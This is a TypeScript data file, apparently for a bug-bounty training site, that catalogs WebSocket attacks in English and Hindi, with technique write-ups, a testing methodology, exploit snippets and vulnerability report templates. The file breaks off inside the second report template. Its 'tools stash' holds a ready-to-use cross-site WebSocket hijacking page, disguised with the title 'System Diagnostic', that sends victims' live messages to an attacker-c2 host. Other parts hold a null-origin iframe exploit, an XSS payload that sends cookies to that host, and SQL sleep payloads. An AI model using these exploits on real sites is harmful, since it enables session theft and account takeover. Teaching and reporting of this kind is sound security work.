import type { Lang } from "./types";

export interface WebsocketScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface WebsocketTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "cswsh_hijack" | "origin_bypass" | "frame_injection" | "ws_smuggling";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: WebsocketScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface WebsocketPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface WebsocketToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "html_exfiltrator" | "python_tester" | "burp_config";
  code: string;
  language: "html" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface WebsocketReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP WEBSOCKET ATTACK TECHNIQUES ──────────────────────────────────────
export const WEBSOCKET_TECHNIQUES: WebsocketTechnique[] = [
  {
    id: "cswsh-cross-site-websocket-hijack",
    title: {
      en: "Cross-Site WebSocket Hijacking (CSWSH): Stealing Live Chats & Tokens via Cross-Origin Handshake",
      simple: "Opening a Live Connection to Victim's Account from an External Site to Steal Messages and Balance",
      hi: "बाहरी वेबसाइट से विक्टिम के अकाउंट का WebSocket खोलकर लाइव चैट, टोकन और बैंक बैलेंस चुराना (CSWSH)",
    },
    category: "cswsh_hijack",
    difficulty: "beginner",
    successRate: "75% on Socket.io, ActionCable, and Custom WSS",
    summary: {
      en: "WebSockets do NOT adhere to the browser's Same-Origin Policy (SOP). When a webpage executes `new WebSocket('wss://target.com/ws')`, the browser automatically attaches all ambient session cookies (Cookie: session=...) to the HTTP 101 Upgrade request. If the backend fails to validate the `Origin:` header or check CSRF tokens, an attacker's website can establish a persistent two-way socket directly into the victim's logged-in session, reading all incoming notifications, balances, and sending unauthorized messages.",
      simple: "Browsers send your login cookies when connecting to WebSockets from ANY website. If target.com forgets to verify where the connection came from (Origin header), an attacker's webpage can secretly read all your private messages and notifications in real-time.",
      hi: "वेबसाइट के WebSocket पर ब्राउज़र का Same-Origin Policy लागू नहीं होता। अटैकर की साइट विक्टिम के कुकीज के साथ टारगेट का सॉकेट जोड़ लेती है और उसके सारे प्राइवेट मेसेज, नोटिफिकेशन और बैलेंस चुरा लेती है।",
    },
    scenarios: [
      {
        title: {
          en: "Live Chat & Session Token Theft via Malicious Origin",
          simple: "Exfiltrating Private Chat History to Attacker C2",
          hi: "अटैकर के सर्वर पर पूरी चैट हिस्ट्री और टोकन भेजना",
        },
        description: {
          en: "Attacker site initiates WebSocket connection to target.com. Because cookies are included, the server accepts the socket. Attacker sends 'fetch_history' and sends the response to attacker webhook.",
          simple: "Attacker's page connects to the victim's socket and asks for chat history and user info.",
          hi: "अटैकर का पेज विक्टिम के सॉकेट से जुड़कर चैट हिस्ट्री और यूज़र डेटा मंगाकर अपने पास सेव कर लेता है।",
        },
        commandOrRequest: `// Attacker's webpage: https://evil.com/exploit.html
const ws = new WebSocket("wss://app.target.com/cable");

ws.onopen = function() {
  console.log("[+] Connected to victim socket!");
  // Request private data
  ws.send(JSON.stringify({
    command: "subscribe",
    identifier: JSON.stringify({ channel: "ChatChannel" })
  }));
};

ws.onmessage = function(event) {
  // Steal incoming private victim messages
  navigator.sendBeacon("https://attacker-c2.com/log", event.data);
};`,
        responseSample: `// Handshake accepted with Origin: https://evil.com
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=

// Incoming frame stolen:
{"channel": "ChatChannel", "message": {"user": "ceo@target.com", "apiKey": "live_sec_99182312"}}`,
        impact: {
          en: "Real-time surveillance of victim's private communications, internal notifications, and complete account takeover via leaked API keys.",
          simple: "Complete leak of private chats and secret API keys in real time.",
          hi: "विक्टिम के प्राइवेट चैट्स, पासवर्ड रिसेट लिंक्स और API कीज का लाइव लीकेज।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inspect network traffic in Burp Suite. Filter by 'WebSockets' or search for HTTP requests with `Upgrade: websocket`.",
        simple: "Find WebSocket connections in Burp (look for 101 Switching Protocols).",
        hi: "Burp में WebSocket कनेक्शन ढूंढें (101 Switching Protocols स्टेटस कोड)।",
      },
      {
        en: "Examine the initial handshake request: Does it use Cookie-based authentication (`Cookie: session=...`)?",
        simple: "Check if the connection uses cookies for login.",
        hi: "चेक करें कि क्या कनेक्शन में कुकीज (`Cookie: session=...`) जा रही हैं।",
      },
      {
        en: "Send the handshake request to Burp Repeater. Change the `Origin:` header to `https://evil.com`.",
        simple: "Change Origin: https://target.com to Origin: https://evil.com in Repeater.",
        hi: "Burp Repeater में `Origin:` हेडर बदलकर `https://evil.com` करें।",
      },
      {
        en: "If the server still responds with HTTP 101 Switching Protocols and connects, CSWSH is confirmed! Write a quick HTML exploit to prove impact.",
        simple: "If you still get 101 Switching Protocols, the server is vulnerable to CSWSH!",
        hi: "अगर सर्वर अभी भी HTTP 101 देता है, तो CSWSH बग कन्फर्म है!",
      },
    ],
    burpOrToolRule: [
      "Burp Match & Replace: Change Origin to https://attacker.com on WebSocket handshakes",
      "Look for missing Sec-WebSocket-Protocol CSRF token or origin check",
    ],
    hunterProTip: {
      en: "Developers who use `Authorization: Bearer <JWT>` inside WebSocket query params (`wss://target.com/ws?token=...`) are NOT vulnerable to CSWSH because browsers cannot inject ambient headers cross-origin. Only Cookie-based WebSockets are vulnerable!",
      simple: "Only WebSockets that authenticate via cookies are vulnerable to CSWSH. If they require a token in the URL, CSWSH does not work.",
      hi: "केवल कुकी-बेस्ड WebSockets ही CSWSH के शिकार होते हैं। अगर वो URL में Bearer टोकन मांगते हैं तो CSWSH काम नहीं करता।",
    },
  },
  {
    id: "websocket-origin-validation-bypasses",
    title: {
      en: "Origin Header Bypass Tricks: Regex Mistakes & Null Origins in WebSocket Handshakes",
      simple: "Bypassing Weak Origin Filters with Null Iframes and Subdomain Regex Flaws",
      hi: "कमजोर Origin फ़िल्टर को Null Iframes और Regex गलतियों से बाईपास करना",
    },
    category: "origin_bypass",
    difficulty: "intermediate",
    successRate: "65% on Custom Regex Handshake Checks",
    summary: {
      en: "Backend developers often implement naive regex checks like `/target\\.com/` to validate the `Origin:` header. Attackers easily bypass this by serving exploits from `https://target.com.attacker.com` or `https://attacker-target.com`. Furthermore, some backends explicitly allow `Origin: null`, which an attacker triggers using sandboxed iframes (`<iframe sandbox='allow-scripts'>`).",
      simple: "Admins write code checking if 'target.com' is in the origin. Attackers buy 'target.com.attacker.com' or use a sandbox iframe that sends Origin: null to bypass the check.",
      hi: "एडमिन गलत Regex लगाते हैं जिससे `target.com.attacker.com` या `Origin: null` को परमिशन मिल जाती है और प्रोटेक्शन फेल हो जाती है।",
    },
    scenarios: [
      {
        title: {
          en: "Bypassing Origin Check via Sandboxed Iframe (Origin: null)",
          simple: "Using Sandbox Iframe to Send Null Origin",
          hi: "सैंडबॉक्स आईफ्रेम से `Origin: null` भेजकर बाईपास करना",
        },
        description: {
          en: "Backend checks `if (!origin || origin === 'null' || allowedOrigins.includes(origin))` thinking null is safe for local files. Attacker uses sandboxed iframe.",
          simple: "Sandboxed iframes strip origin and send 'null', which lazy backends allow.",
          hi: "सैंडबॉक्स आईफ्रेम ब्राउज़र से `Origin: null` भेजता है जिसे सर्वर लोकल फाइल समझकर अनुमति दे देता है।",
        },
        commandOrRequest: `<!-- Exploit hosted on https://attacker.com -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    // In sandboxed iframe without allow-same-origin, Origin header is sent as 'null'
    const ws = new WebSocket('wss://api.target.com/live');
    ws.onopen = () => {
      ws.send(JSON.stringify({action: 'export_financial_records'}));
    };
    ws.onmessage = (e) => {
      fetch('https://attacker-c2.com/exfil?data=' + encodeURIComponent(e.data));
    };
  </script>
"></iframe>`,
        responseSample: `HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

// Server accepted Origin: null!`,
        impact: {
          en: "Bypasses entire origin validation defense, allowing full CSWSH exploitation from any external website.",
          simple: "Completely defeats origin protection using a simple iframe.",
          hi: "Origin सुरक्षा को पूरी तरह खत्म करके सॉकेट हाईजैक कर लेता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Test `Origin: null` in Burp Repeater during WebSocket handshake.",
        simple: "Send Origin: null in the handshake request.",
        hi: "Burp Repeater में `Origin: null` डालकर टेस्ट करें।",
      },
      {
        en: "Test prefix and suffix domains: `Origin: https://target.com.attacker.com` and `Origin: https://target-com.attacker.com`.",
        simple: "Try target.com.attacker.com to test for regex mistakes.",
        hi: "Regex चेक करने के लिए `target.com.attacker.com` ट्राई करें।",
      },
      {
        en: "Test port variations: `Origin: https://target.com:8080` or `Origin: https://target.com:443`.",
        simple: "Add port numbers to the origin.",
        hi: "डोमेन के आगे पोर्ट नंबर (`:8080`) लगाकर टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Origin Fuzz List: null, https://target.com.evil.com, https://evil-target.com",
      "Check: Does server return 101 Switching Protocols on non-whitelisted Origin?",
    ],
    hunterProTip: {
      en: "Always inspect reverse proxy configurations (like Nginx `proxy_set_header Origin $http_origin;`). Some misconfigured Nginx configs strip the `Origin` header before sending it to Node.js/Go, meaning the backend receives an empty origin and defaults to allowing it!",
      simple: "Some proxies strip the Origin header, causing the backend server to assume it was an internal local request!",
      hi: "कुछ Nginx प्रॉक्सी Origin हेडर को हटा देते हैं, जिससे बैकएंड समझता है कि रिक्वेस्ट इंटरनल है और अनुमति दे देता है!",
    },
  },
  {
    id: "websocket-frame-blind-injection",
    title: {
      en: "WebSocket Frame Injection: Stored XSS, SQLi & Remote Command Execution via WS Packets",
      simple: "Injecting Malicious Payloads Inside WebSocket Chat & Notification Messages",
      hi: "WebSocket मेसेज के अंदर XSS, SQL इंजेक्शन और रिमोट कमांड्स भेजना",
    },
    category: "frame_injection",
    difficulty: "intermediate",
    successRate: "70% (WebSockets are rarely inspected by standard WAFs)",
    summary: {
      en: "Most Web Application Firewalls (Cloudflare, AWS WAF, Akamai) only inspect the initial HTTP Upgrade handshake. Once the connection transitions to binary/text WebSocket framing, the WAF stops inspecting individual packets. Attackers inject SQL syntax, stored XSS, and command injection directly inside WebSocket JSON frames without triggering WAF blocks.",
      simple: "WAFs only check the first handshake. Once the WebSocket opens, firewalls stop inspecting the messages! You can send SQL injection and XSS through the socket completely undetected.",
      hi: "WAF केवल शुरुआत का हैंडशेक चेक करते हैं। एक बार सॉकेट खुल जाने के बाद WAF मेसेज चेक नहीं करता! आप आसानी से XSS और SQL इंजेक्शन अंदर भेज सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Stored XSS via Live Chat WebSocket Frame",
          simple: "Firing XSS through WebSocket to Admin Console",
          hi: "WebSocket से एडमिन डैशबोर्ड में XSS फायर करना",
        },
        description: {
          en: "Standard POST /chat is blocked by Cloudflare WAF. Sending `<img src=x onerror=alert(document.domain)>` over the established WebSocket frame bypasses the WAF completely and executes in the support agent's browser.",
          simple: "Send XSS payloads through WebSocket frames to avoid firewall blocks.",
          hi: "फायरवॉल को चकमा देने के लिए XSS पेलोड WebSocket फ्रेम के अंदर से भेजें।",
        },
        commandOrRequest: `// WebSocket Frame sent from client:
{
  "type": "support_message",
  "ticketId": "10029",
  "content": "<svg onload=fetch('https://attacker-c2.com/steal?c='+document.cookie)>"
}`,
        responseSample: `// Server broadcasts frame to all active support agents:
{
  "type": "new_ticket_message",
  "ticketId": "10029",
  "author": "customer",
  "renderedHtml": "<svg onload=fetch('https://attacker-c2.com/steal?c='+document.cookie)>"
}`,
        impact: {
          en: "Executes arbitrary JavaScript in the context of internal support staff, allowing session hijacking and internal admin panel takeover.",
          simple: "Steals cookies and controls internal staff sessions.",
          hi: "सपोर्ट एजेंट और एडमिन के ब्राउज़र में जावास्क्रिप्ट रन कराकर उनका सेशन चुराना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Establish a legitimate WebSocket session in your browser while monitoring Burp's 'WebSockets history' tab.",
        simple: "Open Burp's WebSockets history tab and look at message frames.",
        hi: "Burp के 'WebSockets history' टैब में जाकर जाने-आने वाले फ्रेम्स देखें।",
      },
      {
        en: "Identify JSON keys that get reflected in the UI (chat messages, profile updates, notifications).",
        simple: "Find fields that appear on the screen (like chat text or names).",
        hi: "देखें कि कौन सा टेक्स्ट स्क्रीन पर दिखता है (जैसे चैट या नाम)।",
      },
      {
        en: "Inject standard XSS and SQLi payloads directly into the frame using Burp Repeater (WebSockets).",
        simple: "Send XSS and SQL injection payloads directly through WebSocket Repeater.",
        hi: "Burp के WebSocket Repeater से सीधे XSS और SQL पेलोड्स भेजें।",
      },
      {
        en: "Observe if the payload executes in other clients or triggers SQL errors in responses.",
        simple: "Check if the payload executes on other users' screens.",
        hi: "चेक करें कि क्या दूसरे यूज़र्स के ब्राउज़र में XSS ट्रिगर हुआ।",
      },
    ],
    burpOrToolRule: [
      "Burp Suite Professional: WebSockets Repeater",
      "Payload: {\"message\": \"<script>alert(1)</script>\"}",
    ],
    hunterProTip: {
      en: "Look for Blind SQL Injection in WebSocket database query frames! If a frame sends `{\"action\": \"filter_orders\", \"sort\": \"id\"}`, changing `\"sort\": \"id; WAITFOR DELAY '0:0:10'--\"` or `SLEEP(10)` often triggers SQLi because developers assume WebSockets are internal and don't sanitize inputs!",
      simple: "Test for SQL injection in sorting/filtering fields inside WebSocket messages! Developers rarely sanitize them.",
      hi: "WebSocket के अंदर फिल्टर या सॉर्टिंग वाले फील्ड्स में SQLi टेस्ट करें — डेवलपर्स वहां इनपुट सैनिटाइज करना भूल जाते हैं!",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY ───────────────────────────────────────────────────
export const WEBSOCKET_METHODOLOGY_PHASES: WebsocketPhase[] = [
  {
    phase: 1,
    title: {
      en: "WebSocket Surface Discovery & Handshake Reconnaissance",
      simple: "Finding Active WebSockets",
      hi: "सक्रिय WebSocket कनेक्शनों की खोज और पहचान",
    },
    objective: {
      en: "Map all real-time communication protocols, WebSocket endpoints, and transport libraries across the target.",
      simple: "Discover all WebSocket endpoints used by the application.",
      hi: "वेबसाइट में चल रहे सारे WebSocket एंडपॉइंट्स ढूंढना।",
    },
    steps: [
      {
        en: "Filter Burp HTTP proxy history for status 101 or header `Upgrade: websocket`.",
        simple: "Look for HTTP 101 Switching Protocols in Burp history.",
        hi: "Burp में 101 Switching Protocols और Upgrade: websocket वाले लिंक्स ढूंढें।",
      },
      {
        en: "Fuzz common real-time paths: `/ws`, `/cable`, `/socket.io/`, `/graphql`, `/realtime`, `/notifications/stream`.",
        simple: "Fuzz common endpoints like /ws, /socket.io, and /cable.",
        hi: "सामान्य पाथ्स को फ़ज़ करें जैसे /ws, /cable, /socket.io।",
      },
      {
        en: "Identify authentication mechanism: Are credentials passed via ambient Cookies, URL parameters (`?token=`), or in-frame handshake (`{\"type\": \"auth\"}`)?",
        simple: "Check how the socket verifies who you are (Cookies vs Tokens).",
        hi: "देखें कि ऑथेंटिकेशन कुकीज से होता है या URL टोकन से।",
      },
    ],
    keyTargets: ["/ws", "/socket.io/", "/cable", "/live", "/stream"],
    commandsOrPayloads: [
      "wscat -c wss://target.com/ws",
      "curl -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' https://target.com/ws",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Origin Header Verification & CSRF Immunity Testing",
      simple: "Testing if Cross-Site Sites Can Connect",
      hi: "Origin हेडर और CSRF सुरक्षा की जांच",
    },
    objective: {
      en: "Verify if the server enforces strict origin validation during the WebSocket handshake.",
      simple: "Check if the server accepts connections from external sites.",
      hi: "जांचें कि क्या बाहरी वेबसाइट्स भी सॉकेट जोड़ सकती हैं।",
    },
    steps: [
      {
        en: "Send handshake in Repeater with `Origin: https://evil.com`. Check for 101 vs 403 response.",
        simple: "Change Origin to https://evil.com and see if it connects.",
        hi: "Origin को evil.com करके चेक करें कि क्या 101 स्टेटस कोड मिलता है।",
      },
      {
        en: "Test `Origin: null` via sandboxed iframe PoC.",
        simple: "Test if Origin: null is accepted.",
        hi: "`Origin: null` डालकर चेक करें कि क्या सैंडबॉक्स बाईपास होता है।",
      },
      {
        en: "Test regex edge cases (`target.com.evil.com`, `evil-target.com`).",
        simple: "Test domain permutations to break weak regexes.",
        hi: "कमजोर regex को तोड़ने के लिए डोमेन में हेरफेर करके भेजें।",
      },
    ],
    keyTargets: ["Origin Header", "Sec-WebSocket-Key", "Sec-WebSocket-Version"],
  },
  {
    phase: 3,
    title: {
      en: "Bi-Directional Action Hijacking & Data Exfiltration",
      simple: "Stealing Real-Time Messages via Script",
      hi: "स्क्रिप्ट के ज़रिये लाइव डेटा और मैसेज चुराना",
    },
    objective: {
      en: "Demonstrate tangible impact by crafting a complete JavaScript PoC that opens a victim socket and steals data.",
      simple: "Build a working HTML page that extracts real victim data.",
      hi: "काम करने वाला HTML पेज बनाकर विक्टिम का प्राइवेट डेटा चुराना।",
    },
    steps: [
      {
        en: "Map out the protocol's initiation commands (e.g. Socket.io packet format `42[\"subscribe\", ...]`).",
        simple: "Learn what message the client sends first after connecting.",
        hi: "कनेक्ट होने के बाद पहला मेसेज क्या जाता है वो नोट करें।",
      },
      {
        en: "Write an HTML payload that connects to `wss://target.com/ws` and sends the initialization frame.",
        simple: "Create an HTML page that connects and requests sensitive data.",
        hi: "HTML पेज बनाकर सॉकेट जोड़ें और गुप्त जानकारी मंगाएं।",
      },
      {
        en: "Transmit captured messages to an external listener (`navigator.sendBeacon('https://c2.com/log', data)`).",
        simple: "Send the stolen data to your attacker server.",
        hi: "चुराया हुआ डेटा अपने अटैकर सर्वर पर भेजें।",
      },
    ],
    keyTargets: ["Chat History", "Billing Notifications", "Private Auth Tokens", "2FA Codes"],
  },
  {
    phase: 4,
    title: {
      en: "Frame-Level Injection & Payload Smuggling",
      simple: "Testing Injection Attacks Inside Socket Messages",
      hi: "सॉकेट मेसेज के अंदर XSS और SQL इंजेक्शन टेस्ट करना",
    },
    objective: {
      en: "Bypass perimeter WAF inspection by delivering SQLi, XSS, and command injection inside established WebSocket streams.",
      simple: "Send attacks through the open socket where firewalls cannot see them.",
      hi: "WAF से बचते हुए WebSocket के अंदर से XSS और SQL पेलोड्स चलाना।",
    },
    steps: [
      {
        en: "Fuzz all JSON parameters inside WebSocket frames for Stored XSS.",
        simple: "Inject XSS into chat and profile fields inside WebSocket messages.",
        hi: "चैट और प्रोफाइल वाले फील्ड्स में XSS इंजेक्ट करें।",
      },
      {
        en: "Test SQL injection on query/filter operations sent over WebSockets.",
        simple: "Inject SQL sleep commands into database sorting parameters.",
        hi: "डेटाबेस सॉर्टिंग और सर्च वाले पैरामीटर्स में SQLi टेस्ट करें।",
      },
      {
        en: "Check for Deserialization flaws in binary / serialized WebSocket protocols.",
        simple: "Test for insecure deserialization in Java/Node serialized frames.",
        hi: "सीरियलाइज्ड डेटा में डीसीरियलाइजेशन कमजोरियां ढूंढें।",
      },
    ],
    keyTargets: ["Chat Messages", "Filter Inputs", "Search Queries", "Status Updates"],
  },
  {
    phase: 5,
    title: {
      en: "DoS & Connection Pool Exhaustion",
      simple: "Testing Server Crash via Socket Flooding",
      hi: "सॉकेट फ्लडिंग से सर्वर पर लोड और क्रैश टेस्ट",
    },
    objective: {
      en: "Evaluate rate-limiting, maximum concurrent socket limits per IP, and payload size bounds.",
      simple: "Check if opening hundreds of sockets slows down the server.",
      hi: "चेक करें कि क्या एक साथ सैकड़ों सॉकेट खोलने से सर्वर हैंग होता है।",
    },
    steps: [
      {
        en: "Measure maximum concurrent WebSocket connections allowed from a single IP.",
        simple: "Test how many connections you can open from 1 IP.",
        hi: "देखें कि 1 IP से कितने सॉकेट खोले जा सकते हैं।",
      },
      {
        en: "Send large frames (e.g. 50MB string) to test memory exhaustion limits.",
        simple: "Send giant messages to test if the server runs out of memory.",
        hi: "बड़ा पेलोड भेजकर चेक करें कि मेमोरी लिमिट्स लागू हैं या नहीं।",
      },
    ],
    keyTargets: ["Concurrent Connection Limits", "Max Frame Size", "Keep-Alive Ping Timers"],
  },
];

// ─── 3. EXPLOIT SCRIPTS & TOOLS STASH ────────────────────────────────────────
export const WEBSOCKET_TOOLS_STASH: WebsocketToolSnippet[] = [
  {
    id: "cswsh-live-exfiltrator-html",
    title: {
      en: "Interactive Cross-Site WebSocket Hijacking (CSWSH) PoC HTML",
      simple: "One-Click HTML Exploit Page to Exfiltrate Victim Socket Data",
      hi: "विक्टिम का लाइव सॉकेट डेटा चुराने वाला पूरा CSWSH HTML एक्सप्लॉइट पेज",
    },
    description: {
      en: "Complete standalone exploit page. When an authenticated victim visits this page, it establishes a WebSocket connection to the target using their cookies, dumps all live chat messages, and logs them to an attacker webhook.",
      simple: "Ready-to-use HTML POC that connects to the target socket using victim's cookies.",
      hi: "रेडी-टू-यूज़ HTML POC जो विक्टिम के कुकीज से सॉकेट जोड़कर सारा डेटा चुराता है।",
    },
    category: "html_exfiltrator",
    language: "html",
    code: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>System Diagnostic</title>
</head>
<body style="font-family: monospace; background: #0f172a; color: #38bdf8; padding: 20px;">
  <h2>[!] Cross-Site WebSocket Hijacking Proof of Concept</h2>
  <p>Connecting to victim session socket...</p>
  <div id="log" style="background: black; padding: 15px; border-radius: 8px; max-height: 400px; overflow: auto;"></div>

  <script>
    const TARGET_WS_URL = "wss://app.target.com/cable";
    const ATTACKER_C2 = "https://attacker-c2.com/log";
    const logBox = document.getElementById("log");

    function log(msg) {
      logBox.innerHTML += "<div>" + msg + "</div>";
      console.log(msg);
    }

    log("[*] Initializing cross-origin WebSocket connection to: " + TARGET_WS_URL);
    
    // Browser automatically attaches victim's ambient session cookies
    const ws = new WebSocket(TARGET_WS_URL);

    ws.onopen = function() {
      log("[+] HANDSHAKE SUCCESS! Origin validation was bypassed.");
      log("[*] Sending subscription payload...");

      // Example ActionCable subscription or custom JSON handshake
      const initPayload = {
        command: "subscribe",
        identifier: JSON.stringify({ channel: "NotificationChannel" })
      };
      ws.send(JSON.stringify(initPayload));
    };

    ws.onmessage = function(event) {
      log("[+] STOLEN FRAME RECEIVED: " + event.data);

      // Exfiltrate stolen victim data to attacker webhook
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ATTACKER_C2, event.data);
      } else {
        fetch(ATTACKER_C2, { method: "POST", body: event.data, mode: "no-cors" });
      }
    };

    ws.onerror = function(err) {
      log("[-] WebSocket Error: Connection dropped or rejected.");
    };

    ws.onclose = function() {
      log("[*] Connection closed.");
    };
  </script>
</body>
</html>`,
    howToUse: {
      en: "Update TARGET_WS_URL and ATTACKER_C2 with your endpoints. Host on GitHub Pages or local server. Open in a browser where you are logged into Target.",
      simple: "Set your target URL and webhook, then open the HTML page in a logged-in browser.",
      hi: "टारगेट URL और वेबहुक सेट करें, फिर जिस ब्राउज़र में लॉगिन हैं वहां यह HTML पेज खोलें।",
    },
  },
  {
    id: "python-websocket-origin-fuzzer",
    title: {
      en: "Python WebSocket Origin Security & Handshake Fuzzer",
      simple: "Automated Script to Test Origin Bypasses on WebSockets",
      hi: "WebSocket पर Origin बाईपास चेक करने वाली ऑटोमेटेड पायथन स्क्रिप्ट",
    },
    description: {
      en: "Connects to a WebSocket URL while cycling through 15+ malicious Origin headers to identify missing origin verification and regex vulnerabilities.",
      simple: "Tests 15 different Origin headers to find out if the WebSocket is vulnerable.",
      hi: "15 अलग-अलग Origin हेडर्स भेजकर चेक करती है कि क्या हैंडशेक स्वीकार हो रहा है।",
    },
    category: "python_tester",
    language: "python",
    code: `import websocket
import sys

TARGET_URL = "wss://app.target.com/ws"
COOKIE = "session=VICTIM_SESSION_COOKIE"

ORIGINS_TO_TEST = [
    ("Unrestricted Attacker Domain", "https://attacker.com"),
    ("Null Origin", "null"),
    ("Suffix Traversal", "https://app.target.com.attacker.com"),
    ("Hyphen Spoof", "https://attacker-target.com"),
    ("Subdomain Spoof", "https://evil.sub.target.com"),
    ("Port Permutation", "https://app.target.com:8443"),
    ("HTTP Insecure Origin", "http://app.target.com"),
    ("Empty Origin", "")
]

print(f"[*] Testing WebSocket Handshake Origin validation on {TARGET_URL}\\n")

for label, origin in ORIGINS_TO_TEST:
    headers = [f"Cookie: {COOKIE}"]
    if origin != "":
        headers.append(f"Origin: {origin}")
        
    try:
        ws = websocket.create_connection(
            TARGET_URL,
            header=headers,
            timeout=5
        )
        print(f"[!] VULNERABLE TO CSWSH! Accepted {label} (Origin: '{origin}')")
        ws.close()
    except websocket.WebSocketBadStatusException as e:
        print(f"[-] Blocked {label} (HTTP {e.status_code})")
    except Exception as e:
        print(f"[-] Rejected {label}: {e}")

print("\\n[*] Scan complete.")`,
    howToUse: {
      en: "Install websocket-client: `pip install websocket-client`. Set TARGET_URL and session COOKIE. Run: `python3 ws_origin_fuzzer.py`.",
      simple: "Install websocket-client, set your target URL and cookie, then run the script.",
      hi: "`pip install websocket-client` करें, TARGET_URL और COOKIE डालें, फिर स्क्रिप्ट चलाएं।",
    },
  },
];

// ─── 4. P1/P2 REPORT TEMPLATES ────────────────────────────────────────────────
export const WEBSOCKET_REPORT_TEMPLATES: WebsocketReportTemplate[] = [
  {
    id: "rep-cswsh-account-takeover",
    title: {
      en: "Critical Cross-Site WebSocket Hijacking (CSWSH) Leading to Full Private Data Exfiltration",
      simple: "Cross-Site WebSocket Hijacking (CSWSH) Exfiltrating Private Data",
      hi: "क्रॉस-साइट WebSocket हाईजैकिंग (CSWSH) जिससे प्राइवेट डेटा और टोकन्स चोरी हो रहे हैं",
    },
    vulnType: "CWE-1385: Missing Origin Validation in WebSockets (CSWSH)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (8.8 - High / 9.1 Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The WebSocket service at \`wss://app.target.com/cable\` fails to validate the \`Origin\` header during the initial HTTP 101 Switching Protocols handshake. Because authentication relies entirely on session cookies (\`Cookie: _target_session=...\`), the browser automatically attaches these ambient credentials when an external third-party website initiates a connection.

An attacker can host an exploit page on \`https://attacker.com\`. When any authenticated user visits this link, the attacker's script opens a full bidirectional WebSocket into the victim's session, exfiltrating live chat messages, internal notifications, billing receipts, and personal information in real time.

---

## Technical Details:
- **Vulnerable Endpoint:** \`wss://app.target.com/cable\`
- **Root Cause:** The server accepts connections regardless of the \`Origin\` header value (e.g. \`Origin: https://evil.com\` or \`Origin: null\` succeeds with HTTP 101).
- **Missing Defense:** No CSRF token is negotiated or validated during the handshake, and no SameSite=Strict cookie policy is enforced.

---

## Step-by-Step Reproduction:
1. Log into your account on \`https://app.target.com\`.
2. Save the following HTML exploit on an external web server (\`https://attacker.com/poc.html\`):

\`\`\`html
<!DOCTYPE html>
<html>
<body>
  <h2>Proof of Concept</h2>
  <script>
    const ws = new WebSocket("wss://app.target.com/cable");
    ws.onopen = function() {
      ws.send(JSON.stringify({
        command: "subscribe",
        identifier: JSON.stringify({ channel: "UserFeedChannel" })
      }));
    };
    ws.onmessage = function(e) {
      alert("Stolen private data:\\n" + e.data);
      fetch("https://attacker-c2.com/log", { method: "POST", body: e.data, mode: "no-cors" });
    };
  </script>
</body>
</html>
\`\`\`

3. In a new tab of the same browser, visit \`https://attacker.com/poc.html\`.
4. Observe the JavaScript alert displaying your private account notifications and live data.
5. In your server logs, notice the incoming beacon containing the victim's full message stream.

---

## Impact:
- Complete confidentiality breach of all real-time communications and private feeds.
- Full Account Takeover if password reset links or authentication tokens are broadcast over the socket.

---

## Remediation Guidance:
1. **Enforce Strict Origin Whitelisting:** Validate the \`Origin\` header against an explicit, strict whitelist of trusted domains (e.g. \`https://app.target.com\`) during the HTTP 101 handshake.
2. **Implement Anti-CSRF Handshake Tokens:** Require a one-time cryptographically random CSRF token passed either as a subprotocol (\`Sec-WebSocket-Protocol\`) or in the initial connect frame.
3. **Use SameSite=Lax or Strict Cookies:** Configure session cookies with \`SameSite=Lax\` or \`SameSite=Strict\` so browsers refuse to send them during cross-site WebSocket initiation.`,
  },
  {
    id: "rep-websocket-stored-xss",
    title: {
      en: "Stored Cross-Site Scripting (XSS) via Unsanitized WebSocket Frame Delivery",
      simple: "Stored XSS via WebSocket Chat Messages Bypassing WAF",
      hi: "WebSocket फ्रेम के ज़रिये WAF बाईपास करके Stored XSS चलाना",
    },
    vulnType: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (9.0 - Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The internal support chat feature at \`https://app.target.com/support\` is vulnerable to Stored Cross-Site Scripting (XSS) transmitted via WebSocket text frames. 

While standard HTTP POST endpoints are protected by Cloudflare WAF, WebSocket message frames bypass perimeter inspection. An attacker can transmit arbitrary HTML and JavaScript inside the \`content\` field of a WebSocket message frame. When a support agent or another user opens the ticket, the script executes immediately in their browser context.

---

## Step-by-Step Reproduction:
1. Open \`https://app.target.com/support\` and click **New Ticket**.
2. Intercept the outgoing WebSocket frames in Burp Suite.
3. Send the following frame via Burp WebSockets Repeater:

\`\`\`json
{
  "type": "chat_message",
